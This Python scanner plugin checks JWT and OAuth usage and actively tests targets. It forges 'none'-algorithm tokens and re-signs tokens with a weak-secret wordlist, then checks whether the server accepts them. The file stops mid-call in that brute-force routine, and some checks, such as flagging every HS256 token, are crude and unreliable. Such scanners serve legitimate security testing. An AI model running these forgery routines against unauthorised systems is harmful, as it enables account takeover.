"""
Comprehensive JWT Security Checker Plugin
Advanced JWT token vulnerability detection, OAuth flow analysis, and security testing.
Covers all major JWT attack vectors and security best practices.
"""

import re
import json
import base64
import hashlib
import hmac
import uuid
import secrets
import time
from typing import Dict, List, Any, Optional, Tuple, Set
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend

from api_security_scanner.core.scanner_plugins import BasePlugin, PluginResult, Vulnerability, ProofOfConcept, format_http_request, format_http_response


class JWTSecurityChecker(BasePlugin):
    """Comprehensive JWT security analysis plugin covering all major attack vectors."""
    
    name = "JWTSecurityChecker"
    description = "Advanced JWT token vulnerability detection, OAuth flow analysis, and security testing"
    version = "2.0.0"
    author = "API Security Scanner"
    
    def __init__(self, zap=None, target=None):
        super().__init__(zap=zap, target=target)
        self.jwt_pattern = re.compile(r'^[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}$')
        self.bearer_pattern = re.compile(r'Bearer\s+([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', re.IGNORECASE)
        self.oauth_patterns = {
            'authorization_code': re.compile(r'authorization_code', re.IGNORECASE),
            'client_credentials': re.compile(r'client_credentials', re.IGNORECASE),
            'password': re.compile(r'password', re.IGNORECASE),
            'refresh_token': re.compile(r'refresh_token', re.IGNORECASE),
            'implicit': re.compile(r'implicit', re.IGNORECASE)
        }
        
        # Common weak secrets for brute force testing
        self.weak_secrets = [
            'secret', 'password', '123456', 'admin', 'test', 'key', 'jwt',
            'secretkey', 'mysecret', 'supersecret', 'jwtsecret', 'token',
            'changeme', 'default', 'password123', 'secret123', 'jwt123'
        ]
        
        # JWT attack vectors
        self.attack_vectors = {
            'algorithm_confusion': ['none', 'HS256', 'HS384', 'HS512'],
            'weak_algorithms': ['HS256', 'HS384', 'HS512', 'RS256'],
            'vulnerable_claims': ['iss', 'sub', 'aud', 'exp', 'nbf', 'iat', 'jti'],
            'sensitive_data_patterns': [
                'password', 'secret', 'key', 'token', 'credential', 'auth',
                'ssn', 'social_security', 'credit_card', 'card_number',
                'email', 'phone', 'address', 'dob', 'birth_date'
            ]
        }
        
    def check(self, target_url: str, requests_data: List[Dict[str, Any]], 
              auth_headers: Optional[Dict[str, str]] = None) -> PluginResult:
        """Perform comprehensive JWT security analysis on requests and responses."""
        vulnerabilities = []
        
        try:
            for request in requests_data:
                url = request.get('url', '')
                method = request.get('method', 'GET')
                
                # Make request with authentication
                headers = request.get('headers', {}).copy()
                if auth_headers:
                    headers.update(auth_headers)
                
                response = self.make_request(url, method, headers, request.get('body') or '')
                
                if response:
                    # First, check if this request/response contains JWT or OAuth flows
                    if self._contains_jwt_or_oauth(request, response):
                        self.logger.info(f"JWT/OAuth detected in {url}, running comprehensive security analysis")
                        
                        # 1. Analyze JWT tokens in request/response
                        jwt_vulns = self._analyze_jwt_tokens(request, response, url, method, headers)
                        vulnerabilities.extend(jwt_vulns)
                        
                        # 2. Perform JWT attack testing
                        attack_vulns = self._perform_jwt_attacks(request, response, url, method, headers)
                        vulnerabilities.extend(attack_vulns)
                        
                        # 3. Analyze OAuth flows
                        oauth_vulns = self._analyze_oauth_flows(request, response, url, method, headers)
                        vulnerabilities.extend(oauth_vulns)
                        
                        # 4. Check for JWT implementation vulnerabilities
                        impl_vulns = self._check_jwt_implementation_vulnerabilities(request, response, url, method, headers)
                        vulnerabilities.extend(impl_vulns)
                        
                        # 5. Check for token storage vulnerabilities
                        storage_vulns = self._check_token_storage_vulnerabilities(request, response, url, method, headers)
                        vulnerabilities.extend(storage_vulns)
                        
                        # 6. Check for JWT key management vulnerabilities
                        key_vulns = self._check_jwt_key_management(request, response, url, method, headers)
                        vulnerabilities.extend(key_vulns)
                        
                        # 7. Check for JWT timing attacks
                        timing_vulns = self._check_jwt_timing_attacks(request, response, url, method, headers)
                        vulnerabilities.extend(timing_vulns)
                        
                        # 8. Check for JWT replay attacks
                        replay_vulns = self._check_jwt_replay_attacks(request, response, url, method, headers)
                        vulnerabilities.extend(replay_vulns)
        
        except Exception as e:
            return PluginResult(
                plugin_name=self.name,
                success=False,
                vulnerabilities=[],
                error=f"JWT security check failed: {str(e)}"
            )
        
        return PluginResult(
            plugin_name=self.name,
            success=True,
            vulnerabilities=vulnerabilities,
            error=None
        )
    
    def _contains_jwt_or_oauth(self, request: Dict[str, Any], response: Any) -> bool:
        """Check if request/response contains JWT tokens or OAuth flows."""
        # Check request headers for JWT tokens
        headers = request.get('headers', {})
        for header_name, header_value in headers.items():
            if self._is_jwt_token(header_value):
                return True
        
        # Check request body for OAuth flows
        body = request.get('body', '')
        if body:
            try:
                if isinstance(body, str):
                    # Check for OAuth grant types
                    for grant_type, pattern in self.oauth_patterns.items():
                        if pattern.search(body):
                            return True
                    
                    # Check for JWT in body
                    if self._is_jwt_token(body):
                        return True
            except:
                pass
        
        # Check response for JWT tokens
        if response and hasattr(response, 'text'):
            response_text = response.text
            if self._is_jwt_token(response_text):
                return True
            
            # Check for OAuth-related content
            oauth_indicators = ['access_token', 'refresh_token', 'id_token', 'token_type', 'expires_in']
            for indicator in oauth_indicators:
                if indicator in response_text.lower():
                    return True
        
        return False
    
    def _is_jwt_token(self, text: str) -> bool:
        """Check if text contains a JWT token."""
        if not text:
            return False
        
        # Check for Bearer token format
        bearer_match = self.bearer_pattern.search(text)
        if bearer_match:
            return bool(self.jwt_pattern.match(bearer_match.group(1)))
        
        # Check for standalone JWT pattern
        return bool(self.jwt_pattern.search(text))
    
    def _extract_jwt_tokens(self, request: Dict[str, Any], response: Any) -> List[Dict[str, str]]:
        """Extract JWT tokens from request and response."""
        tokens = []
        
        # Extract from request headers
        headers = request.get('headers', {})
        for header_name, header_value in headers.items():
            if self._is_jwt_token(header_value):
                bearer_match = self.bearer_pattern.search(header_value)
                if bearer_match:
                    tokens.append({
                        'token': bearer_match.group(1),
                        'location': f'Request Header: {header_name}',
                        'type': 'request'
                    })
        
        # Extract from request body
        body = request.get('body', '')
        if body and self._is_jwt_token(body):
            jwt_match = self.jwt_pattern.search(body)
            if jwt_match:
                tokens.append({
                    'token': jwt_match.group(0),
                    'location': 'Request Body',
                    'type': 'request'
                })
        
        # Extract from response
        if response and hasattr(response, 'text'):
            response_text = response.text
            jwt_matches = self.jwt_pattern.findall(response_text)
            for token in jwt_matches:
                tokens.append({
                    'token': token,
                    'location': 'Response Body',
                    'type': 'response'
                })
        
        return tokens
    
    def _analyze_jwt_tokens(self, request: Dict[str, Any], response: Any, 
                           url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
        """Analyze JWT tokens for security vulnerabilities."""
        vulnerabilities = []
        tokens = self._extract_jwt_tokens(request, response)
        
        for token_info in tokens:
            token = token_info['token']
            location = token_info['location']
            
            try:
                # Decode JWT token
                header, payload, signature = token.split('.')
                
                # Decode header and payload
                header_data = self._decode_jwt_part(header)
                payload_data = self._decode_jwt_part(payload)
                
                # Check for weak algorithms
                alg_vulns = self._check_weak_algorithms(header_data, token, url, method, headers, location)
                vulnerabilities.extend(alg_vulns)
                
                # Check for missing or weak signatures
                sig_vulns = self._check_signature_vulnerabilities(header_data, payload_data, signature, token, url, method, headers, location)
                vulnerabilities.extend(sig_vulns)
                
                # Check for token expiration issues
                exp_vulns = self._check_token_expiration(payload_data, token, url, method, headers, location)
                vulnerabilities.extend(exp_vulns)
                
                # Check for sensitive data in tokens
                data_vulns = self._check_sensitive_data_in_token(payload_data, token, url, method, headers, location)
                vulnerabilities.extend(data_vulns)
                
                # Check for algorithm confusion attacks
                conf_vulns = self._check_algorithm_confusion(header_data, payload_data, token, url, method, headers, location)
                vulnerabilities.extend(conf_vulns)
                
            except Exception as e:
                # Invalid JWT format
                vuln = self.create_vulnerability(
                    vuln_id=f"jwt-invalid-format-{uuid.uuid4().hex[:8]}",
                    name="Invalid JWT Token Format",
                    description=f"JWT token found in {location} has invalid format: {str(e)}",
                    risk="Medium",
                    cvss_score=5.3,
                    solution="Ensure JWT tokens follow the correct format: header.payload.signature",
                    references=["https://tools.ietf.org/html/rfc7519"],
                    cwe_id="CWE-345",
                    wasc_id="WASC-15",
                    url=url,
                    parameter=location,
                    evidence=f"Invalid JWT: {token[:50]}...",
                    scan_id="jwt-scan",
                    request=format_http_request(method, url, headers, request.get('body', '')),
                    response=format_http_response(response.status_code, response.headers, response.text) if response else ""
                )
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _analyze_oauth_flows(self, request: Dict[str, Any], response: Any, 
                            url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
        """Analyze OAuth flows for security vulnerabilities."""
        vulnerabilities = []
        
        # Check for OAuth grant type vulnerabilities
        grant_vulns = self._check_oauth_grant_types(request, response, url, method, headers)
        vulnerabilities.extend(grant_vulns)
        
        # Check for OAuth redirect URI vulnerabilities
        redirect_vulns = self._check_oauth_redirect_uri(request, response, url, method, headers)
        vulnerabilities.extend(redirect_vulns)
        
        # Check for OAuth scope vulnerabilities
        scope_vulns = self._check_oauth_scope_vulnerabilities(request, response, url, method, headers)
        vulnerabilities.extend(scope_vulns)
        
        # Check for OAuth state parameter vulnerabilities
        state_vulns = self._check_oauth_state_parameter(request, response, url, method, headers)
        vulnerabilities.extend(state_vulns)
        
        return vulnerabilities
    
    def _check_weak_algorithms(self, header_data: Dict[str, Any], token: str, 
                              url: str, method: str, headers: Dict[str, str], location: str) -> List[Vulnerability]:
        """Check for weak JWT algorithms."""
        vulnerabilities = []
        
        if not header_data:
            return vulnerabilities
        
        algorithm = header_data.get('alg', '').upper()
        
        # Check for 'none' algorithm
        if algorithm == 'NONE':
            vuln = self.create_vulnerability(
                vuln_id=f"jwt-none-algorithm-{uuid.uuid4().hex[:8]}",
                name="JWT None Algorithm Vulnerability",
                description=f"JWT token uses 'none' algorithm, making it unsigned and vulnerable to tampering. Found in {location}",
                risk="High",
                cvss_score=8.1,
                solution="Use a strong signing algorithm like RS256, ES256, or HS256 with a secure key",
                references=[
                    "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/",
                    "https://tools.ietf.org/html/rfc7519"
                ],
                cwe_id="CWE-345",
                wasc_id="WASC-15",
                url=url,
                parameter=location,
                evidence=f"Algorithm: {algorithm}",
                scan_id="jwt-scan",
                request=format_http_request(method, url, headers, ""),
                response=""
            )
            vulnerabilities.append(vuln)
        
        # Check for weak HMAC algorithms
        elif algorithm in ['HS256', 'HS384', 'HS512']:
            vuln = self.create_vulnerability(
                vuln_id=f"jwt-weak-hmac-{uuid.uuid4().hex[:8]}",
                name="JWT Weak HMAC Algorithm",
                description=f"JWT token uses HMAC algorithm ({algorithm}) which is vulnerable to brute force attacks if the secret key is weak. Found in {location}",
                risk="Medium",
                cvss_score=6.5,
                solution="Use asymmetric algorithms like RS256 or ES256, or ensure HMAC secret is cryptographically strong",
                references=[
                    "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/",
                    "https://tools.ietf.org/html/rfc7518"
                ],
                cwe_id="CWE-327",
                wasc_id="WASC-15",
                url=url,
                parameter=location,
                evidence=f"Algorithm: {algorithm}",
                scan_id="jwt-scan",
                request=format_http_request(method, url, headers, ""),
                response=""
            )
            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _check_signature_vulnerabilities(self, header_data: Dict[str, Any], payload_data: Dict[str, Any], 
                                        signature: str, token: str, url: str, method: str, 
                                        headers: Dict[str, str], location: str) -> List[Vulnerability]:
        """Check for JWT signature vulnerabilities."""
        vulnerabilities = []
        
        if not header_data:
            return vulnerabilities
        
        algorithm = header_data.get('alg', '').upper()
        
        # Check for missing signature
        if not signature or signature == '':
            vuln = self.create_vulnerability(
                vuln_id=f"jwt-missing-signature-{uuid.uuid4().hex[:8]}",
                name="JWT Missing Signature",
                description=f"JWT token is missing signature, making it unsigned and vulnerable to tampering. Found in {location}",
                risk="High",
                cvss_score=8.1,
                solution="Always include a valid signature in JWT tokens",
                references=["https://tools.ietf.org/html/rfc7519"],
                cwe_id="CWE-345",
                wasc_id="WASC-15",
                url=url,
                parameter=location,
                evidence="Missing signature",
                scan_id="jwt-scan",
                request=format_http_request(method, url, headers, ""),
                response=""
            )
            vulnerabilities.append(vuln)
        
        # Check for weak signature (if we can detect it)
        elif len(signature) < 32:  # Very short signature might indicate weak implementation
            vuln = self.create_vulnerability(
                vuln_id=f"jwt-weak-signature-{uuid.uuid4().hex[:8]}",
                name="JWT Weak Signature",
                description=f"JWT token signature appears to be weak or improperly implemented. Found in {location}",
                risk="Medium",
                cvss_score=6.5,
                solution="Ensure JWT signatures are properly generated with strong cryptographic methods",
                references=["https://tools.ietf.org/html/rfc7519"],
                cwe_id="CWE-327",
                wasc_id="WASC-15",
                url=url,
                parameter=location,
                evidence=f"Signature length: {len(signature)}",
                scan_id="jwt-scan",
                request=format_http_request(method, url, headers, ""),
                response=""
            )
            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _check_token_expiration(self, payload_data: Dict[str, Any], token: str, 
                               url: str, method: str, headers: Dict[str, str], location: str) -> List[Vulnerability]:
        """Check for JWT token expiration issues."""
        vulnerabilities = []
        
        if not payload_data:
            return vulnerabilities
        
        # Check for missing expiration
        if 'exp' not in payload_data:
            vuln = self.create_vulnerability(
                vuln_id=f"jwt-missing-expiration-{uuid.uuid4().hex[:8]}",
                name="JWT Missing Expiration",
                description=f"JWT token does not include expiration time (exp claim), making it valid indefinitely. Found in {location}",
                risk="Medium",
                cvss_score=6.5,
                solution="Always include expiration time (exp claim) in JWT tokens",
                references=["https://tools.ietf.org/html/rfc7519"],
                cwe_id="CWE-613",
                wasc_id="WASC-15",
                url=url,
                parameter=location,
                evidence="Missing exp claim",
                scan_id="jwt-scan",
                request=format_http_request(method, url, headers, ""),
                response=""
            )
            vulnerabilities.append(vuln)
        
        # Check for very long expiration times
        elif 'exp' in payload_data:
            try:
                exp_timestamp = int(payload_data['exp'])
                exp_time = datetime.fromtimestamp(exp_timestamp)
                current_time = datetime.now()
                
                if exp_time > current_time + timedelta(days=365):  # More than 1 year
                    vuln = self.create_vulnerability(
                        vuln_id=f"jwt-long-expiration-{uuid.uuid4().hex[:8]}",
                        name="JWT Long Expiration Time",
                        description=f"JWT token has very long expiration time ({exp_time.strftime('%Y-%m-%d %H:%M:%S')}), increasing security risk. Found in {location}",
                        risk="Low",
                        cvss_score=4.3,
                        solution="Use shorter expiration times for JWT tokens (recommended: 15 minutes to 1 hour)",
                        references=["https://tools.ietf.org/html/rfc7519"],
                        cwe_id="CWE-613",
                        wasc_id="WASC-15",
                        url=url,
                        parameter=location,
                        evidence=f"Expiration: {exp_time.strftime('%Y-%m-%d %H:%M:%S')}",
                        scan_id="jwt-scan",
                        request=format_http_request(method, url, headers, ""),
                        response=""
                    )
                    vulnerabilities.append(vuln)
            except (ValueError, TypeError):
                pass
        
        return vulnerabilities
    
    def _check_sensitive_data_in_token(self, payload_data: Dict[str, Any], token: str, 
                                      url: str, method: str, headers: Dict[str, str], location: str) -> List[Vulnerability]:
        """Check for sensitive data in JWT payload."""
        vulnerabilities = []
        
        if not payload_data:
            return vulnerabilities
        
        # Check for common sensitive data patterns
        sensitive_patterns = {
            'password': re.compile(r'password|passwd|pwd', re.IGNORECASE),
            'secret': re.compile(r'secret|key|private', re.IGNORECASE),
            'ssn': re.compile(r'ssn|social_security', re.IGNORECASE),
            'credit_card': re.compile(r'credit_card|card_number|cc_number', re.IGNORECASE),
            'email': re.compile(r'email|mail', re.IGNORECASE)
        }
        
        for claim_name, claim_value in payload_data.items():
            for pattern_name, pattern in sensitive_patterns.items():
                if pattern.search(claim_name) or (isinstance(claim_value, str) and pattern.search(claim_value)):
                    vuln = self.create_vulnerability(
                        vuln_id=f"jwt-sensitive-data-{uuid.uuid4().hex[:8]}",
                        name="JWT Contains Sensitive Data",
                        description=f"JWT token contains potentially sensitive data ({pattern_name}) in claim '{claim_name}'. Found in {location}",
                        risk="Medium",
                        cvss_score=6.5,
                        solution="Avoid storing sensitive data in JWT tokens. Use tokens only for authentication/authorization claims",
                        references=["https://tools.ietf.org/html/rfc7519"],
                        cwe_id="CWE-200",
                        wasc_id="WASC-15",
                        url=url,
                        parameter=location,
                        evidence=f"Claim: {claim_name}",
                        scan_id="jwt-scan",
                        request=format_http_request(method, url, headers, ""),
                        response=""
                    )
                    vulnerabilities.append(vuln)
                    break
        
        return vulnerabilities
    
    def _check_algorithm_confusion(self, header_data: Dict[str, Any], payload_data: Dict[str, Any], 
                                  token: str, url: str, method: str, headers: Dict[str, str], location: str) -> List[Vulnerability]:
        """Check for algorithm confusion vulnerabilities."""
        vulnerabilities = []
        
        if not header_data:
            return vulnerabilities
        
        algorithm = header_data.get('alg', '').upper()
        
        # Check for algorithm confusion (RS256 -> HS256)
        if algorithm == 'HS256':
            vuln = self.create_vulnerability(
                vuln_id=f"jwt-algorithm-confusion-{uuid.uuid4().hex[:8]}",
                name="JWT Algorithm Confusion Vulnerability",
                description=f"JWT token uses HS256 algorithm which is vulnerable to algorithm confusion attacks. Found in {location}",
                risk="High",
                cvss_score=8.1,
                solution="Use RS256 or ES256 algorithms and validate the algorithm on the server side",
                references=[
                    "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/",
                    "https://tools.ietf.org/html/rfc7519"
                ],
                cwe_id="CWE-327",
                wasc_id="WASC-15",
                url=url,
                parameter=location,
                evidence=f"Algorithm: {algorithm}",
                scan_id="jwt-scan",
                request=format_http_request(method, url, headers, ""),
                response=""
            )
            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _check_oauth_grant_types(self, request: Dict[str, Any], response: Any, 
                                url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
        """Check for OAuth grant type vulnerabilities."""
        vulnerabilities = []
        
        body = request.get('body', '')
        if not body:
            return vulnerabilities
        
        try:
            # Parse body as JSON or form data
            if isinstance(body, str):
                if body.strip().startswith('{'):
                    data = json.loads(body)
                else:
                    data = dict(parse_qs(body))
            else:
                data = body
            
            grant_type = None
            if isinstance(data, dict):
                grant_type = data.get('grant_type')
                if isinstance(grant_type, list):
                    grant_type = grant_type[0] if grant_type else None
            
            if grant_type and isinstance(grant_type, str):
                # Check for password grant type
                if grant_type.lower() == 'password':
                    vuln = self.create_vulnerability(
                        vuln_id=f"oauth-password-grant-{uuid.uuid4().hex[:8]}",
                        name="OAuth Password Grant Type",
                        description="OAuth flow uses password grant type which is deprecated and insecure",
                        risk="High",
                        cvss_score=7.5,
                        solution="Use authorization code grant type with PKCE instead of password grant",
                        references=["https://tools.ietf.org/html/rfc6749"],
                        cwe_id="CWE-287",
                        wasc_id="WASC-15",
                        url=url,
                        parameter="grant_type",
                        evidence=f"Grant type: {grant_type}",
                        scan_id="jwt-scan",
                        request=format_http_request(method, url, headers, body),
                        response=format_http_response(response.status_code, response.headers, response.text) if response else ""
                    )
                    vulnerabilities.append(vuln)
                
                # Check for implicit grant type
                elif grant_type.lower() == 'implicit':
                    vuln = self.create_vulnerability(
                        vuln_id=f"oauth-implicit-grant-{uuid.uuid4().hex[:8]}",
                        name="OAuth Implicit Grant Type",
                        description="OAuth flow uses implicit grant type which is deprecated and insecure",
                        risk="Medium",
                        cvss_score=6.5,
                        solution="Use authorization code grant type with PKCE instead of implicit grant",
                        references=["https://tools.ietf.org/html/rfc6749"],
                        cwe_id="CWE-287",
                        wasc_id="WASC-15",
                        url=url,
                        parameter="grant_type",
                        evidence=f"Grant type: {grant_type}",
                        scan_id="jwt-scan",
                        request=format_http_request(method, url, headers, body),
                        response=format_http_response(response.status_code, response.headers, response.text) if response else ""
                    )
                    vulnerabilities.append(vuln)
        
        except (json.JSONDecodeError, ValueError):
            pass
        
        return vulnerabilities
    
    def _check_oauth_redirect_uri(self, request: Dict[str, Any], response: Any, 
                                 url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
        """Check for OAuth redirect URI vulnerabilities."""
        vulnerabilities = []
        
        # Check for open redirect vulnerabilities in OAuth flows
        if 'oauth' in url.lower() or 'authorize' in url.lower():
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            if 'redirect_uri' in query_params:
                redirect_uri = query_params['redirect_uri'][0]
                
                # Check for wildcard redirect URIs
                if '*' in redirect_uri or 'localhost' in redirect_uri:
                    vuln = self.create_vulnerability(
                        vuln_id=f"oauth-open-redirect-{uuid.uuid4().hex[:8]}",
                        name="OAuth Open Redirect Vulnerability",
                        description=f"OAuth redirect URI contains wildcard or localhost: {redirect_uri}",
                        risk="High",
                        cvss_score=7.5,
                        solution="Use specific, whitelisted redirect URIs and avoid wildcards",
                        references=["https://tools.ietf.org/html/rfc6749"],
                        cwe_id="CWE-601",
                        wasc_id="WASC-15",
                        url=url,
                        parameter="redirect_uri",
                        evidence=f"Redirect URI: {redirect_uri}",
                        scan_id="jwt-scan",
                        request=format_http_request(method, url, headers, ""),
                        response=format_http_response(response.status_code, response.headers, response.text) if response else ""
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _check_oauth_scope_vulnerabilities(self, request: Dict[str, Any], response: Any, 
                                          url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
        """Check for OAuth scope vulnerabilities."""
        vulnerabilities = []
        
        # This would require more context about the OAuth implementation
        # For now, we'll check for overly broad scopes in responses
        if response and hasattr(response, 'text'):
            response_text = response.text.lower()
            
            # Check for overly broad scopes
            broad_scopes = ['admin', 'root', 'all', 'full', 'write', 'delete']
            for scope in broad_scopes:
                if scope in response_text:
                    vuln = self.create_vulnerability(
                        vuln_id=f"oauth-broad-scope-{uuid.uuid4().hex[:8]}",
                        name="OAuth Overly Broad Scope",
                        description=f"OAuth scope appears to be overly broad: {scope}",
                        risk="Medium",
                        cvss_score=6.5,
                        solution="Use principle of least privilege for OAuth scopes",
                        references=["https://tools.ietf.org/html/rfc6749"],
                        cwe_id="CWE-250",
                        wasc_id="WASC-15",
                        url=url,
                        parameter="scope",
                        evidence=f"Broad scope: {scope}",
                        scan_id="jwt-scan",
                        request=format_http_request(method, url, headers, ""),
                        response=format_http_response(response.status_code, response.headers, response.text) if response else ""
                    )
                    vulnerabilities.append(vuln)
                    break
        
        return vulnerabilities
    
    def _check_oauth_state_parameter(self, request: Dict[str, Any], response: Any, 
                                    url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
        """Check for OAuth state parameter vulnerabilities."""
        vulnerabilities = []
        
        # Check for missing state parameter in OAuth authorization requests
        if 'oauth' in url.lower() or 'authorize' in url.lower():
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            if 'state' not in query_params:
                vuln = self.create_vulnerability(
                    vuln_id=f"oauth-missing-state-{uuid.uuid4().hex[:8]}",
                    name="OAuth Missing State Parameter",
                    description="OAuth authorization request is missing state parameter, vulnerable to CSRF attacks",
                    risk="Medium",
                    cvss_score=6.5,
                    solution="Always include a cryptographically random state parameter in OAuth requests",
                    references=["https://tools.ietf.org/html/rfc6749"],
                    cwe_id="CWE-352",
                    wasc_id="WASC-15",
                    url=url,
                    parameter="state",
                    evidence="Missing state parameter",
                    scan_id="jwt-scan",
                    request=format_http_request(method, url, headers, ""),
                    response=format_http_response(response.status_code, response.headers, response.text) if response else ""
                )
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _check_jwt_implementation_vulnerabilities(self, request: Dict[str, Any], response: Any, 
                                                 url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
        """Check for JWT implementation vulnerabilities."""
        vulnerabilities = []
        
        # Check for JWT in URL parameters (insecure)
        if 'jwt' in url.lower() or 'token' in url.lower():
            vuln = self.create_vulnerability(
                vuln_id=f"jwt-url-parameter-{uuid.uuid4().hex[:8]}",
                name="JWT Token in URL Parameter",
                description="JWT token appears to be passed in URL parameters, which is insecure",
                risk="Medium",
                cvss_score=6.5,
                solution="Pass JWT tokens in Authorization header, not in URL parameters",
                references=["https://tools.ietf.org/html/rfc7519"],
                cwe_id="CWE-200",
                wasc_id="WASC-15",
                url=url,
                parameter="URL",
                evidence="JWT token in URL",
                scan_id="jwt-scan",
                request=format_http_request(method, url, headers, ""),
                response=format_http_response(response.status_code, response.headers, response.text) if response else ""
            )
            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _check_token_storage_vulnerabilities(self, request: Dict[str, Any], response: Any, 
                                            url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
        """Check for token storage vulnerabilities."""
        vulnerabilities = []
        
        # Check for tokens in cookies without secure flags
        cookies = headers.get('Cookie', '') or headers.get('cookie', '')
        if 'jwt' in cookies.lower() or 'token' in cookies.lower():
            if 'secure' not in cookies.lower() or 'httponly' not in cookies.lower():
                vuln = self.create_vulnerability(
                    vuln_id=f"jwt-insecure-cookie-{uuid.uuid4().hex[:8]}",
                    name="JWT Token in Insecure Cookie",
                    description="JWT token is stored in cookie without Secure or HttpOnly flags",
                    risk="Medium",
                    cvss_score=6.5,
                    solution="Use Secure and HttpOnly flags for cookies containing JWT tokens",
                    references=["https://tools.ietf.org/html/rfc6265"],
                    cwe_id="CWE-614",
                    wasc_id="WASC-15",
                    url=url,
                    parameter="Cookie",
                    evidence="JWT in cookie without security flags",
                    scan_id="jwt-scan",
                    request=format_http_request(method, url, headers, ""),
                    response=format_http_response(response.status_code, response.headers, response.text) if response else ""
                )
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _perform_jwt_attacks(self, request: Dict[str, Any], response: Any, 
                           url: str, method: str, headers: Dict[str, str]) -> List[Vulnerability]:
        """Perform comprehensive JWT attack testing."""
        vulnerabilities = []
        tokens = self._extract_jwt_tokens(request, response)
        
        for token_info in tokens:
            token = token_info['token']
            location = token_info['location']
            
            # 1. Algorithm confusion attacks
            conf_vulns = self._test_algorithm_confusion_attacks(token, url, method, headers, location)
            vulnerabilities.extend(conf_vulns)
            
            # 2. Brute force attacks on weak secrets
            brute_vulns = self._test_brute_force_attacks(token, url, method, headers, location)
            vulnerabilities.extend(brute_vulns)
            
            # 3. Key confusion attacks
            key_conf_vulns = self._test_key_confusion_attacks(token, url, method, headers, location)
            vulnerabilities.extend(key_conf_vulns)
            
            # 4. Header injection attacks
            header_vulns = self._test_header_injection_attacks(token, url, method, headers, location)
            vulnerabilities.extend(header_vulns)
            
            # 5. Claim manipulation attacks
            claim_vulns = self._test_claim_manipulation_attacks(token, url, method, headers, location)
            vulnerabilities.extend(claim_vulns)
        
        return vulnerabilities
    
    def _test_algorithm_confusion_attacks(self, token: str, url: str, method: str, 
                                        headers: Dict[str, str], location: str) -> List[Vulnerability]:
        """Test for algorithm confusion vulnerabilities."""
        vulnerabilities = []
        
        try:
            header, payload, signature = token.split('.')
            header_data = self._decode_jwt_part(header)
            
            if header_data and header_data.get('alg', '').upper() in ['HS256', 'HS384', 'HS512']:
                # Test algorithm confusion: change algorithm to 'none'
                malicious_header = self._encode_jwt_part({'alg': 'none', 'typ': 'JWT'})
                malicious_token = f"{malicious_header}.{payload}."
                
                # Test if the server accepts the 'none' algorithm
                test_headers = headers.copy()
                test_headers['Authorization'] = f"Bearer {malicious_token}"
                
                test_response = self.make_request(url, method, test_headers, "")
                
                if test_response and test_response.status_code == 200:
                    vuln = self.create_vulnerability(
                        vuln_id=f"jwt-algorithm-confusion-none-{uuid.uuid4().hex[:8]}",
                        name="JWT Algorithm Confusion - None Algorithm",
                        description=f"Server accepts JWT tokens with 'none' algorithm, allowing token forgery. Found in {location}",
                        risk="Critical",
                        cvss_score=9.8,
                        solution="Always validate and whitelist allowed algorithms on the server side",
                        references=[
                            "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/",
                            "https://tools.ietf.org/html/rfc7519"
                        ],
                        cwe_id="CWE-327",
                        wasc_id="WASC-15",
                        url=url,
                        parameter=location,
                        evidence=f"Original algorithm: {header_data.get('alg')}, Tested: none",
                        scan_id="jwt-scan",
                        request=format_http_request(method, url, test_headers, ""),
                        response=format_http_response(test_response.status_code, dict(test_response.headers), test_response.text)
                    )
                    vulnerabilities.append(vuln)
        
        except Exception as e:
            self.logger.debug(f"Algorithm confusion test failed: {e}")
        
        return vulnerabilities
    
    def _test_brute_force_attacks(self, token: str, url: str, method: str, 
                                 headers: Dict[str, str], location: str) -> List[Vulnerability]:
        """Test for weak JWT secrets using brute force."""
        vulnerabilities = []
        
        try:
            header, payload, signature = token.split('.')
            header_data = self._decode_jwt_part(header)
            
            if header_data and header_data.get('alg', '').upper() in ['HS256', 'HS384', 'HS512']:
                # Test common weak secrets
                for secret in self.weak_secrets:
                    try:
                        # Generate signature with weak secret
                        message = f"{header}.{payload}"
                        if header_data.get('alg', '').upper() == 'HS256':
                            expected_sig = base64.urlsafe_b64encode(
                                hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
                            ).decode().rstrip('=')
                        elif header_data.get('alg', '').upper() == 'HS384':
                            expected_sig = base64.urlsafe_b64encode(
                                hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
                            ).decode().rstrip('=')
                        elif header_data.get('alg', '').upper() == 'HS512':
                            expected_sig = base64.urlsafe_b64encode(
                                hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
                            ).decode().rstrip('=')
                        else:
                            continue
                        
                        # Create token with weak secret
                        weak_token = f"{header}.{payload}.{expected_sig}"
                        
                        # Test the weak token
                        test_headers = headers.copy()
                        test_headers['Authorization'] = f"Bearer {weak_token}"
                        
                        test_response = self.make_request(url, method, test_headers, "")
                        
                        if test_response and test_response.status_code == 200:
                            vuln = self.create_vulnerability(
